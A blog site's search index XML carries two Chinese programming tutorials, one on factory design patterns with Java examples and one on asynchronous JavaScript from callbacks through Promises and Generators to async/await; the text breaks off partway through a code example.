<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>设计模式之工厂模式</title>
      <link href="/2020/11/05/DesignPattern-FactoryPattern/"/>
      <url>/2020/11/05/DesignPattern-FactoryPattern/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-简单（静态）工厂模式"><a href="#0x0-简单（静态）工厂模式" class="headerlink" title="0x0 简单（静态）工厂模式"></a>0x0 简单（静态）工厂模式</h1><p>一般来说，OOP语言中获取对象的实例都是通过 new 关键字来调用对象的 constructor，从而将实例传递给某个引用或是具体的左值。constructor 根据特征标的不同来进行重载，以达到按需构建对象的目的。</p><p>但是这里有个问题，对象的初始化工作均交给了 constructor 来完成，这使得其代码往往变得很长，同时，把一些面向某个类而不是某个实例的操作（比如对实例在其类的内部用静态字段进行计数）写在 consturctor 中也不是很优雅。</p><p>更进一步的，像 Java 的 IO 操作中采用了 Filter 模式，这使得一个具备缓冲功能的 FileReader 看起来像这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="keyword">new</span> File(...)))</span><br></pre></td></tr></table></figure><p>如果每次产生这类对象时都这样写，虽然在业务上没什么问题，但是并不利于维护。比如假设突然有了把所有的 Reader 都变成 LineNumberReader 的需求的话，就要修改所有实例的 new 部分。</p><p>简单工厂模式就可以很好地解决上述这些问题。</p><p>要实现简单工厂模式，最基本的是需要一个工厂类，对于上述的 Reader，可以得到如下工厂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReaderFactory</span> </span>&#123;</span><br><span class="line">  <span class="comment">// constructor 设置为 private，因为这个工厂内部只需要静态方法即可</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">ReaderFactory</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Reader <span class="title">createReaderForFile</span><span class="params">(String filename)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="keyword">new</span> File(filename)));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在要获得 Reader 时，可以写类似 <code>Reader bufferedReader = ReaderFactory.createReaderForFile(...)</code> 的代码，而在日后遇到需要修改为 LineNumberReader 的维护需求时，只需要修改工厂中的代码即可。</p><p>这里可以发现，由于 Reader 们都实现了Reader 这个抽象类，所以利用多态的特性，返回的实例可以是任意的子类，那么实际上可以将工厂的生产方法修改为可以根据需求返回不同子类的形式，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReaderFactory</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">ReaderFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Reader <span class="title">createReaderForFile</span><span class="params">(String filename, String readerType)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    Reader fileReader = <span class="keyword">new</span> FileReader(<span class="keyword">new</span> File(filename));</span><br><span class="line">    <span class="keyword">switch</span> (readerType) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"BufferedReader"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> BufferedReader(fileReader);</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"LineNumberReader"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> LineNumberReader(fileReader);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> fileReader;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，在客户端调用工厂的生产方法时，通过提供第二个参数即可获得不同功能的 Reader 对象。</p><p>虽然多数设计模式的书籍或文章在阐述某个模式时都会使用 Java 作为实现语言，但设计模式本身是作用于 OOP 的理念上，所以其他语言中也都有设计模式的身影。对于简单工厂模式，Vue 在使用 rollup 打包后产生的代码（通过结合立即执行表达式IIFE和闭包），我个人认为就是它的一个实现。</p><p>所以，简单工厂模式封装了一部分类的初始化行为，并可以提供按需构建不同子类的功能。这种模式方便了客户端代码（即使用工厂的代码），使其并不需要考虑工厂的具体实现，而只是按需为工厂传递参数即可。</p><h1 id="0x1-工厂方法模式"><a href="#0x1-工厂方法模式" class="headerlink" title="0x1 工厂方法模式"></a>0x1 工厂方法模式</h1><p>虽然简单工厂模式方便了客户端代码，但是由于每次对功能的扩展都要修改工厂的内部代码，不但违反了“开放-封闭原则”，同时在工厂生产方法很大时，每次都要编译许多无关的代码，增大了开发的成本。</p><p>工厂方法模式就可以很好地解决上述问题。</p><p>为了举例，假设我们有一个 Pet 的接口，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Pet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在分别定义猫和狗实体类来实现该接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">implements</span> <span class="title">Pet</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"喵"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">implements</span> <span class="title">Pet</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"汪"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了按需获取 Pet 的实例，我们可以定义 PetFactory 工厂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">PetFactory</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Pet DEFAULT_PET = <span class="keyword">new</span> Pet() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Idk who am I"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Pet <span class="title">createPet</span><span class="params">(String petType)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (petType) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"Cat"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Cat();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"Dog"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Dog();</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> DEFAULT_PET;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是简单工厂模式的一个实现，那么按照上面所说的问题，假设现在要新添加一个 Pet 实体，除了添加一个实现了 Pet 接口的类以外，另要修改 PetFactory.createPet 方法中的 switch。</p><p>那么同样的需求，如果用工厂方法模式来实现会是什么样呢？</p><p>首先，需要把 PetFactory 从类转为接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="function">Pet <span class="title">createPet</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后针对 Cat 和 Dog 分别实现其工厂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里因为逻辑很简单，所以工厂的生产方法只是简单返回实体</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CatFactory</span> <span class="keyword">implements</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Pet <span class="title">createPet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Cat();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DogFactory</span> <span class="keyword">implements</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Pet <span class="title">createPet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Dog();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，客户端的代码可以这样写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  PetFactory catFactory = <span class="keyword">new</span> CatFactory();</span><br><span class="line">  PetFactory dogFactory = <span class="keyword">new</span> DogFactory();</span><br><span class="line">  catFactory.createPet().say();</span><br><span class="line">  dogFactory.createPet().say();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在定义工厂的引用时，类型可直接定义为 PetFactory 接口，然后利用多态的特性来分发具体的工厂。这样一来，我们<strong>定义了一个用于创建对象的接口，让子类来决定实例化哪一个类。工厂方法使一个类的实例化延迟到其子类</strong>。</p><p>和简单工厂模式不同的是，工厂方法模式的客户端做了更多的工作，它需要知道某个实体类对应的具体工厂类。同时，在对实体类的种类进行扩展时，要同时定义这个新的实体类和其对应的工厂类。这样的缺点在于代码量比较大，修改的工作相对于简单工厂模式而言稍有复杂，而优点则在于解决了之前说的问题。即，遵循了“封闭-开放原则”，同时，通过添加新的类而不是修改原有的类来进行业务的扩展，使得按需编译成为可能，减少了开发的成本。</p><h1 id="0x2-抽象工厂模式"><a href="#0x2-抽象工厂模式" class="headerlink" title="0x2 抽象工厂模式"></a>0x2 抽象工厂模式</h1><p>抽象工厂模式的定义是<strong>为创建一组相关或相互依赖的对象提供一个接口，并且无须指定它们的具体类</strong>，从字面意义上来理解，就可以理解为工厂方法模式的加强。也就是说，此时工厂的目标在于创建一系列相互影响或关联的实体类，我们把这些类叫做<strong>产品</strong>，而由于工厂的具体实现不同，所以同类产品也有着一定的差异，在这个横向的对比上，我们把它们叫做一个<strong>产品族</strong>。</p><p>一般来说，抽象工厂模式适用于比较大的项目。比如可以定义一套跨平台的业务接口，让工厂来生产BO们，共同配合以实现某个功能。那么针对不同的平台，就可以有不同的工厂来屏蔽平台之间的差异。而站在客户端的角度，我们只需要结合多态来实例化目标平台的工厂类，就可以通过通用的接口来完成所需的功能。在这个过程中，尽管工厂生成的产品们联系密切，但客户端依然不需要了解产品族中各产品之间的具体差异。</p><p>这即是说，抽象工厂模式把更多的工作放到了接口实现方这边。对于“功能扩展”这项工作，抽象工厂模式可以分为产品扩展和产品族扩展两种。可以发现，产品的扩展其实违背了“开放-封闭原则”，因为它不但要修改工厂接口，还要修改每个现有的工厂实现类；而产品族的扩展则十分优雅，因为抽象工厂模式主打的就是扩展产品族嘛。</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CallBack 与 Promise 与 Generator 与 async/await 的故事</title>
      <link href="/2020/09/29/AsyncJavascript/"/>
      <url>/2020/09/29/AsyncJavascript/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>之前在读 express 相关的项目时经常看到 async/await 关键字，所以就跑去查了一下<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function" target="_blank" rel="noopener">文档</a>，看完以后还是觉得云里雾里；前几天偶然看到阮一峰老师的一篇<a href="http://caibaojian.com/es6/async.html" target="_blank" rel="noopener">文章</a>，文章中整理了当前 Javascript 处理异步的一些方式，并作了一些对比，尤其最后在提到 async/await 时使用 Generator 去模拟其行为，顿时觉得茅塞顿开。</p><p>于是这篇文章就作为一个简单的总结+个人的一些理解，就这样开始写下去了。</p><h1 id="0x1-关于-Javascript-的异步"><a href="#0x1-关于-Javascript-的异步" class="headerlink" title="0x1 关于 Javascript 的异步"></a>0x1 关于 Javascript 的异步</h1><p>之前有看到所谓 “异步就是多线程” 的言论，但是在上文提到的文章中，作者把异步看作是一种可以在两个任务中互相切换（并传递信息）的一种模式（这里的任务指按顺序执行的一段序列），那么根据这个思想，其实 Generator 的模式就可以看作是一种异步，于是它在配合 Javascript 的事件循环（Event Loop）后就可以做到一些奇妙的效果，详见下文。</p><p>众所周知，Javascript 是一门单线程的语言，这句话多少都令人有些疑惑（或者可能单纯是我比较愚钝），比如像 NodeJS 的 fs.readFile ，在 CallBack 被调用前，这个 “唯一” 的线程难道还是要自己去与文件系统交互吗；或者对于 setTimeout ，这个 “唯一” 的线程难道会通过在用户的代码中插入轮询来进行计时吗。</p><p>事实上，这里所谓的单线程指的是用户代码所在的线程（这里姑且称之为主线程），而对于计时器、文件读取这类的操作，Javascript 依然有相应的线程来完成这些任务。也就是说，用户的代码并不能进入到这些线程中来执行，但是可以通过 API 来委托它们执行任务，那么就需要一种方式，使得这些线程在执行完相应的任务后能通知到主线程，对于这种方式，首先能想到的就是 CallBack。</p><h1 id="0x2-关于-CallBack"><a href="#0x2-关于-CallBack" class="headerlink" title="0x2 关于 CallBack"></a>0x2 关于 CallBack</h1><p>CallBack 并不是专门用来解决异步问题的，它只是一个被作为参数传递给另一个函数的函数，这样看来其实像 Decorator 这种的都可以算作是一种 CallBack。</p><p>回到异步的话题上，在 Javascript 的一种异步模式中，CallBack 用于告知对应的任务线程，在执行完主线程分发的任务后调用之，从而让执行流回到主线程中。比如前文所述的 readFile，对应的代码大概如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line">readFile(..., (err, data) =&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里 readFile 的第二个参数就是一个 CallBack，它委托与文件系统交互的线程去读取由第一个参数指明的文件。在它执行任务的期间，有可能成功也有可能失败，所以 NodeJs 大部分的 CallBack 的第一个参数都用来记录错误，后面的则用来处理成功后获取到的数据，在我看来这是一个非常优雅的模式，它并没有什么心智负担，写起来非常自然。</p><p>但是一旦异步的操作有了前后的顺序依赖，事情就变得不尽人意了，鼎鼎大名的回调地狱（CallBack Hell）就是由此产生的，还是之前读文件的例子，比如业务一定要按照 <code>file1 -&gt; file2 -&gt; file3 -&gt; ...</code> 这样的顺序来进行的话，那么回调就会一层套用一层，最终的结果是代码变得横向发展，这是十分不美观且难以维护的状态。</p><p>于是 Promise 出现了。</p><h1 id="0x3-关于-Promise"><a href="#0x3-关于-Promise" class="headerlink" title="0x3 关于 Promise"></a>0x3 关于 Promise</h1><p>Promise 其实是一种新的回调模式，网络上有大量相关的 polyfill，看一下代码就可以明白内部的基本原理（这里特别推荐一下 <a href="https://github.com/ysmood/yaku" target="_blank" rel="noopener">yaku</a> 这个库，贺老曾对此有过很高的评价）。</p><p>这里额外说明一件事，就是虽然 Promise 在大部分的实现里都以微任务来执行，但是标准中并没有提及这件事，以至于我见过的 polyfill 基本都是用 setTimeout 来模拟的，所以在写业务的时候其实不能过分依赖这一点。</p><p>回到上面的异步顺序依赖的问题，对于那种逻辑，如果用 CallBack 来写的话，大概是这个样子:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line">readFile(<span class="string">'file1'</span>, (err, data) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File1 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">  readFile(<span class="string">'file2'</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`File2 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">    readFile(<span class="string">'file3'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">`File3 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">      readFile(<span class="string">'...'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里仅仅读取了三个文件，代码的缩进就已经到了很深的程度了，而且冗余性特别大，尽管对于这个样例，错误处理的逻辑可能是完全一样的，每个回调对应的错误还是要分别处理。</p><p>而同样的逻辑，如果用 Promise 写出来是这样的:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>).promises</span><br><span class="line"></span><br><span class="line">readFile(<span class="string">'file1'</span>, &#123; <span class="attr">encoding</span>: <span class="string">'utf8'</span> &#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File1 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">  <span class="keyword">return</span> readFile(<span class="string">'file2'</span>, &#123; <span class="attr">encoding</span>: <span class="string">'utf8'</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File2 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">  <span class="keyword">return</span> readFile(<span class="string">'file3'</span>, &#123; <span class="attr">encoding</span>: <span class="string">'utf8'</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File3 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>可以看到，Promise 很优雅地解决了上面说的两个问题，拯救被回调地狱折磨的前辈们于水火之中。</p><h1 id="0x4-更进一步"><a href="#0x4-更进一步" class="headerlink" title="0x4 更进一步"></a>0x4 更进一步</h1><p>虽然 Promise 很优雅，可以很好地解决上面提到的问题，但是一个是因为程序员比较懒，一个是因为 Promise 写多了确实有点烦，所以大家就又开始找新的解决顺序依赖的方式。</p><p>先说为什么比较烦，上面的例子因为逻辑很简单，而且只有三个显式的顺序依赖所以可能不太明显，但是想象一下如果顺序很多，那么代码里基本上全是 then then then，一个是放眼望去基本看不出主要的逻辑，另一个是…顺序依赖其实是一个挺大众的需求，如果有一个语法糖能提供更好的支持，那真的是一件令人高兴的事情。</p><p>于是我们的主角就出场了，它叫 await ，平时只喜欢和 async 待在一起，对于具体的用法稍稍 STFW 一下就有很多，所以我比较想从 Generator + Promise 的角度来描写它，那么下面就先来说一下 Generator。</p><h1 id="0x5-关于-Generator"><a href="#0x5-关于-Generator" class="headerlink" title="0x5 关于 Generator"></a>0x5 关于 Generator</h1><p>Generator 这个概念（机制）也不是 Js 这门语言独有的，比如 Python 中就有同样的机制。在 Js 中，一个 Generator 是一个带星号的函数，内部可以通过 yield 关键字来“送出”和“接收”数据，它大概长下面的样子，这里就不详细介绍它了，具体的机制可以看相关的<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Generator" target="_blank" rel="noopener">文档</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">ImaGenerator</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> data = <span class="keyword">yield</span> <span class="string">"Send data from generator"</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Get data from main:"</span>, data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> gen = ImaGenerator()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Get data from generator:"</span>, gen.next().value)</span><br><span class="line">gen.next(<span class="string">"Send data from main"</span>)</span><br></pre></td></tr></table></figure><p>可能是由于代码量比较少，平时写的时候还没用实际到过这项技术，不过我还是比较感谢曾经学习了它的自己，让我能够借助它来更好地理解 async/await。</p><p>前面说过，异步可以被理解成是一种在两个顺序流程之间切换并传递信息的运行模式，那么如果把这个思想落实到 Generator 上就可以发现，yield 关键字既可以让流程从 Generator 中切换到外部执行流，又可以携带特定的信息；next 方法在另一方面使得流程回到 Generator 中成为可能。</p><p>于是，通过观察前面 CallBack 和 Promise 阅读文件的例子，就可以发现其具备特定的规律，从而结合 Generator 写出如下的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// callback + generator 的例子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Thunkify</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">argExceptCb</span> (<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">argIncludeCb</span> (<span class="params">cb</span>) </span>&#123;</span><br><span class="line">      fn.call(fn, ...args, cb)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> readFile = Thunkify(fs.readFile)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">readFiles</span> (<span class="params">...filenames</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (fn <span class="keyword">of</span> filenames) &#123;</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">yield</span> readFile(fn)</span><br><span class="line">    <span class="built_in">console</span>.log(content)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runThunkifyGen</span> (<span class="params">gen</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">next</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ret = gen.next(data)    </span><br><span class="line">    <span class="keyword">if</span> (ret.done) <span class="keyword">return</span></span><br><span class="line">    ret.value(next)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  next()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">runThunkifyGen(readFiles(<span class="string">'file1'</span>, <span class="string">'file2'</span>, <span class="string">'file3'</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Read done'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// promise + generator 的例子</span></span><br><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span 